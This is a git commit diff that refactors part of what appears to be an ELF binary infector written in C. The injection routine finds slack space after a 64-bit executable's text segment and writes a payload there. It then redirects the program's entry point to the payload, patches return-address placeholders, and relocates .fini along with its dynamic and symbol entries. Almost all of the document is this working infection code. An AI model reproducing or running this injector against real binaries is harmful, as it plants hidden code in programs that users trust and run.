985ddd9223def468f305bffc77cd8c82384908b8
Matteo Bucci <matteobu02@yahoo.fr>
2024-11-17 23:01:00 +0100

    somewhat cleaner code

--- src/c/elf64.c
+++ src/c/elf64.c
@@ -5,12 +5,7 @@
 #include <unistd.h>
 #include "infector.h"
 
-#define PAGE_ALIGN_UP(X, Y) (((Y) != 0) ? (((X) + (Y) - 1) / (Y) * (Y)) : (X))
-
-/* Global Variables */
-static Elf64_Addr g_handler_addr = 0;
-static Elf64_Off g_handler_off = 0;
-static uint64_t g_handler_size = 0;
+#define PAGE_ALIGN_UP(X, Y) (((X) + (Y) - 1) / (Y) * (Y))
 
 /* CODE */
 static int check_boundaries(const t_target *target)
@@ -25,128 +20,120 @@ static int check_boundaries(const t_target *target)
     return 0;
 }
 
-static void patch_fini_symbol(Elf64_Ehdr *elf, Elf64_Off old_fini, Elf64_Off new_fini)
+static uint8_t inject(Elf64_Ehdr *elf, void *payload, uint64_t payloadsz)
 {
-    const Elf64_Shdr *sh = (void *)elf + elf->e_shoff;
-    const Elf64_Shdr *sym_sect = NULL;
+    /* Find text segment and get padding between text segment and next segment */
+    uint64_t padding = 0;
+    Elf64_Phdr *text_seg = NULL;
+    Elf64_Phdr *ph_tab = (Elf64_Phdr *)((void *)elf + elf->e_phoff);
+    for (uint16_t i = 0; i < elf->e_phnum; ++i)
+    {
+        if (ph_tab[i].p_type == PT_LOAD && ph_tab[i].p_flags == (PF_R | PF_X))
+        {
+            text_seg = &ph_tab[i];
+            if (i < elf->e_phnum)
+                padding = ph_tab[i + 1].p_offset - (ph_tab[i].p_offset + ph_tab[i].p_filesz);
+            break;
+        }
+    }
+    if (!text_seg || padding < payloadsz)
+        return 1;
 
-    // find symbol table
+    /* Find .fini and .text sections */
+    Elf64_Shdr *text_sect = NULL, *fini_sect = NULL;
+    Elf64_Shdr *sh_tab = (Elf64_Shdr *)((void *)elf + elf->e_shoff);
     for (uint16_t i = 0; i < elf->e_shnum; ++i)
     {
-        if (sh[i].sh_type == SHT_SYMTAB)
+        /*
+         * We assume that there is a .fini section and that it's at the end of the text segment.
+         */
+        if ((sh_tab[i].sh_offset + sh_tab[i].sh_size) == (text_seg->p_offset + text_seg->p_filesz))
         {
-            sym_sect = &sh[i];
+            fini_sect = &sh_tab[i];
+            text_sect = &sh_tab[i - 1];
             break;
         }
     }
 
-    // return if the file doesn't contain any symbols
-    if (!sym_sect)
-        return;
+    /* Save injection offset */
+    Elf64_Off injection_off = text_sect->sh_offset + text_sect->sh_size;
 
-    // find _fini symbol in symbol table
+    /* Patch program's entry point */
+    Elf64_Off code_entry = elf->e_entry;
+    if (elf->e_type == ET_EXEC)
+    {
+        elf->e_entry = text_sect->sh_addr + text_sect->sh_size;
+        patch_payload_addr64(payload, payloadsz, 0xAAAAAAAAAAAAAAAA, 0);
+    }
+    else
+    {
+        elf->e_entry = injection_off;
+        patch_payload_addr64(payload, payloadsz, 0xAAAAAAAAAAAAAAAA, 1);
+    }
+    patch_payload_addr64(payload, payloadsz, 0x3333333333333333, code_entry); // return controlflow
+
+    /* Save old .fini offset */
+    Elf64_Off old_fini_off = fini_sect->sh_offset;
+    /* Get new aligned .fini offset and address */
+    Elf64_Off new_fini_off = PAGE_ALIGN_UP(injection_off + payloadsz, fini_sect->sh_addralign);
+    Elf64_Addr new_fini_addr = PAGE_ALIGN_UP(text_sect->sh_addr + text_sect->sh_size + payloadsz, fini_sect->sh_addralign);
+
+    /* Move .fini */
+    memmove((void *)elf + new_fini_off, (void*)elf + fini_sect->sh_offset, fini_sect->sh_size);
+
+    /* Write payload after .text (overriding old .fini) */
+    memmove((void*)elf + injection_off, payload, payloadsz);
+
+    /* Update text segment size */
+    text_seg->p_filesz = text_seg->p_filesz - old_fini_off + new_fini_off;
+    text_seg->p_memsz = text_seg->p_filesz;
+
+    /* Increase offset of .fini */
+    fini_sect->sh_offset = new_fini_off;
+    fini_sect->sh_addr = new_fini_addr;
+
+    /* Add payload size to .text size */
+    text_sect->sh_size += payloadsz;
+
+    /* Find .dynamic section */
+    Elf64_Shdr *dyn_sect = NULL;
+    for (uint16_t i = 0; i < elf->e_shnum; ++i)
+    {
+        if (sh_tab[i].sh_type == SHT_DYNAMIC)
+        {
+            dyn_sect = &sh_tab[i];
+            break;
+        }
+    }
+    if (!dyn_sect)
+        return 1;
+
+    /* Patch _fini offset in .dynamic */
+    patch_payload_addr64((void*)elf + dyn_sect->sh_offset, dyn_sect->sh_size, old_fini_off, new_fini_off);
+
+    /* Find .symtab section */
+    Elf64_Shdr *sym_sect = NULL;
+    for (uint16_t i = 0; i < elf->e_shnum; ++i)
+    {
+        if (sh_tab[i].sh_type == SHT_SYMTAB)
+        {
+            sym_sect = &sh_tab[i];
+            break;
+        }
+    }
+    if (!sym_sect)
+        return 0;
+
+    /* Find _fini symbol in symbol table */
     Elf64_Sym *sym = (void *)elf + sym_sect->sh_offset;
     const uint64_t sym_num = sym_sect->sh_size / sym_sect->sh_entsize;
     for (uint64_t s = 0; s < sym_num; ++s)
     {
-        // patch _fini symbol value
-        if (sym[s].st_value == old_fini)
+        /* Patch _fini symbol value */
+        if (sym[s].st_value == old_fini_off)
         {
-            sym[s].st_value = new_fini;
-            return;
-        }
-    }
-}
-
-static uint8_t perform_injection(Elf64_Ehdr *elf, void *handler)
-{
-    Elf64_Phdr *ph_tab = (Elf64_Phdr *)((void *)elf + elf->e_phoff);
-    Elf64_Shdr *sh_tab = (Elf64_Shdr *)((void *)elf + elf->e_shoff);
-    Elf64_Off original_fini_off, aligned_fini_off;
-    uint64_t padding = 0;
-    uint8_t patched = 0;
-
-    for (uint16_t i = 0; i < elf->e_phnum && !patched; ++i)
-    {
-        if (ph_tab[i].p_type == PT_LOAD && ph_tab[i].p_flags == (PF_R | PF_X))
-        {
-            if (i < elf->e_phnum) // ph_tab[TEXT] is not the last segment
-                padding = ph_tab[i + 1].p_offset - (ph_tab[i].p_offset + ph_tab[i].p_filesz);
-            else // ph_tab[TEXT] is the last segment
-                padding = elf->e_shoff - (ph_tab[i].p_offset + ph_tab[i].p_filesz); // TODO: make room by shifting shdr
-            if (padding < g_handler_size)
-                return write_error(NULL, PADD_ERR);
-
-            for (uint16_t fini = 0; fini < elf->e_shnum && !patched; ++fini)
-            {
-                // find .fini section
-                if ((sh_tab[fini].sh_offset + sh_tab[fini].sh_size) == (ph_tab[i].p_offset + ph_tab[i].p_filesz))
-                {
-                    // find .text section
-                    for (uint16_t text = 0; text < elf->e_shnum && !patched; ++text)
-                    {
-                        // technically, the first section before .fini
-                        // ---> TODO: use string table to find actual .text and .fini sections
-                        if ((PAGE_ALIGN_UP(sh_tab[text].sh_offset + sh_tab[text].sh_size, sh_tab[fini].sh_addralign)) == sh_tab[fini].sh_offset)
-                        {
-                            g_handler_addr = sh_tab[text].sh_addr + sh_tab[text].sh_size;
-                            g_handler_off = sh_tab[text].sh_offset + sh_tab[text].sh_size;
-
-                            // patch entry to land handler (== end of .text)
-                            Elf64_Addr code_entry = elf->e_entry;
-                            if (elf->e_type == ET_EXEC)
-                            {
-                                elf->e_entry = g_handler_addr;
-                                patch_payload_addr64(handler, g_handler_size, 0xAAAAAAAAAAAAAAAA, 0);
-                            }
-                            else
-                            {
-                                elf->e_entry = g_handler_off;
-                                patch_payload_addr64(handler, g_handler_size, 0xAAAAAAAAAAAAAAAA, 1);
-                            }
-                            patch_payload_addr64(handler, g_handler_size, 0x3333333333333333, code_entry); // return controlflow
-
-                            aligned_fini_off = PAGE_ALIGN_UP(sh_tab[text].sh_offset + sh_tab[text].sh_size + g_handler_size, sh_tab[fini].sh_addralign);
-
-                            // shift contents of .fini
-                            memmove((void *)elf + aligned_fini_off, (void*)elf + sh_tab[fini].sh_offset, sh_tab[fini].sh_size);
-
-                            // write handler after original .text
-                            memmove((void*)elf + g_handler_off, handler, g_handler_size);
-
-                            original_fini_off = sh_tab[fini].sh_offset;
-
-                            // patch _fini symbol
-                            patch_fini_symbol(elf, original_fini_off, aligned_fini_off);
-
-                            // inc segment size
-                            ph_tab[i].p_filesz = ph_tab[i].p_filesz - original_fini_off + aligned_fini_off;
-                            ph_tab[i].p_memsz = ph_tab[i].p_filesz;
-
-                            // inc offset of .fini shdr
-                            sh_tab[fini].sh_offset = aligned_fini_off;
-                            sh_tab[fini].sh_addr = PAGE_ALIGN_UP(sh_tab[text].sh_addr + sh_tab[text].sh_size + g_handler_size, sh_tab[fini].sh_addralign);
-
-                            // inc size of .text
-                            sh_tab[text].sh_size += g_handler_size;
-
-                            patched = 1;
-                        }
-                    }
-                }
-            }
-        }
-    }
-
-    if (!patched)
-        return 1;
-
-    // patch dynamic section, if it's there
-    for (uint16_t i = 0; i < elf->e_phnum; ++i)
-    {
-        if (ph_tab[i].p_type == PT_DYNAMIC)
-        {
-            patch_payload_addr64((void*)elf + ph_tab[i].p_offset, ph_tab[i].p_filesz, original_fini_off, aligned_fini_off);
+            sym[s].st_value = new_fini_off;
+            break;
         }
     }
 
@@ -159,13 +146,14 @@ int infect_elf64(t_target *target)
         return write_error(target->filename, CORRUPT_ERR);
 
     // get injection handler
-    void *handler = read_file(HANDLER_ELF64_PATH, &g_handler_size);
+    uint64_t handlersz = 0;
+    void *handler = read_file(HANDLER_ELF64_PATH, &handlersz);
     if (!handler)
         return 1;
 
     // prepare for injection
     Elf64_Ehdr *elf = (Elf64_Ehdr *)target->base;
-    if (perform_injection(elf, handler))
+    if (inject(elf, handler, handlersz))
         return 1;
 
     free(handler);
